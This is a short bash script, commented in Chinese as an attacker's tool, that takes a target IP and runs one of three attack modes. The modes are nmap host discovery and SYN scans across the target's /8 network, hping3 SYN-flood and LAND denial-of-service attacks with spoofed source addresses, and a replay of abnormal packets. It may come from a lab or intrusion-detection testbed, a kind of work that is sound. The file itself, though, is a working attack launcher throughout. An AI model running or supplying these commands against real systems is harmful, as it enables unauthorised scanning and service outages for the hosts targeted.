#!/bin/bash
# 攻击者针对指定服务器使用各种攻击

if [ $# -le 1 ]
then
    echo "Usage: %prog <target ip> <method>"
    echo "Method: [1: Discovering; 2: DoS; 3: Vulns]"
    exit
fi

cd hacker

# python pingDos.py $1 &
# python synFlood.py $1 &

if [ $2 -eq 1 ]
then
    echo "Start Discovering"
    nmap -sP $1/8 &                                     # Host Discovery
    nmap -sS $1/8 &                                     # Port Scanning
elif [ $2 -eq 2 ]
then
    echo "Start DoS"
    hping3 -I eth0 -a 10.0.0.3 -S $1 -p 80 -i u1 &      # SYN Flood
    hping3 -I eth0 -a $1 -S $1 -p 80 -i u1 &            # LAND
elif [ $2 -eq 3 ]
then
    echo "Start Vulns"
    python ../client/sendPacket.py $1 abnormal.txt &    # Vulns
fi
wait